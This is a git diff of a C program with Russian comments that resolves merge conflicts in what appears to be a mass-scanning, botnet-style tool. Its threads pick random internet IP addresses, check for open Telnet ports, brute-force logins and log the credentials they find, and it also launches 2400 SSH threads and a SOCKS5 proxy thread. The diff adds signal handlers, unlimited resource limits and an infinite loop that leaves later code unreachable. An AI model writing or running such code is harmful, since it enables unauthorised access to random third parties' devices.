@@ -58,10 +58,16 @@ void *telnet_bruteforce_thread(void *arg) {
     while (1) {
         char ip_address[IP_ADDRESS_LENGTH];
         generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
+        
+        // Проверка валидности IP
+        if (strlen(ip_address) == 0) {
+            sleep(1);
+            continue;
+        }
+
         printf("Проверка IP для Telnet: %s\n", ip_address);
         fflush(stdout);
 
-<<<<<<< HEAD
         // Добавляем обработку ошибок
         int port_status = check_port_open_on_ip(ip_address, TELNET_PORT);
         if (port_status == -1) {
@@ -73,10 +79,6 @@ void *telnet_bruteforce_thread(void *arg) {
             Credentials telnet_credentials = {0};
             
 
-=======
-        if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
-            Credentials telnet_credentials = telnet_brute(ip_address);
->>>>>>> parent of d9d4aee (not done, but memory fix, i DO NOT LIKE F****** C!)
             if (telnet_credentials.good) {
                 printf("Успешный вход Telnet: %s:%s\n", 
                        telnet_credentials.username, telnet_credentials.password);
@@ -86,7 +88,8 @@ void *telnet_bruteforce_thread(void *arg) {
                                        telnet_credentials.password);
             }
         }
-        sleep(0.1);
+        
+        usleep(100000); // 100ms задержка
     }
     return NULL;
 }
@@ -103,9 +106,26 @@ void ensure_results_directory() {
     }
 }
 
-// Обновите main(), добавив создание директории:
-// Обновите main(), добавив создание директории:
+void signal_handler(int signum) {
+    printf("Получен сигнал %d, выполняется очистка...\n", signum);
+    // Здесь можно добавить код очистки
+    exit(signum);
+}
+
 int main() {
+    // Установка обработчиков сигналов
+    signal(SIGSEGV, signal_handler);
+    signal(SIGABRT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    signal(SIGINT, signal_handler);
+
+    // Установка лимитов ресурсов
+    struct rlimit limit;
+    limit.rlim_cur = RLIM_INFINITY;
+    limit.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_CORE, &limit);
+    setrlimit(RLIMIT_STACK, &limit);
+
     while (1) {
         // Создаем директорию для результатов
         ensure_results_directory();
@@ -136,8 +156,11 @@ int main() {
             return 1;
         }
 
+        while(1) {
+            sleep(1); // Чтобы не нагружать процессор
+        }
+
         // Ожидание завершения потоков SSH
-<<<<<<< HEAD
         for (int i = 0; i < 2400; i++) {
             pthread_detach(ssh_threads[i]);
         }
@@ -149,20 +172,6 @@ int main() {
 
         // Ожидание завершения потока SOCKS5
         pthread_detach(socks5_thread_id);
-=======
-        for (int i = 0; i < 60; i++) {
-            pthread_join(ssh_threads[i], NULL);
-        }
-
-        // Ожидание завершения потоков Telnet
-        for (int i = 0; i < 60; i++) {
-            pthread_join(telnet_threads[i], NULL);
-        }
-
-        // Ожидание завершения потока SOCKS5
-        pthread_join(socks5_thread_id, NULL);
-
->>>>>>> parent of d9d4aee (not done, but memory fix, i DO NOT LIKE F****** C!)
         return 0;
     }
 }
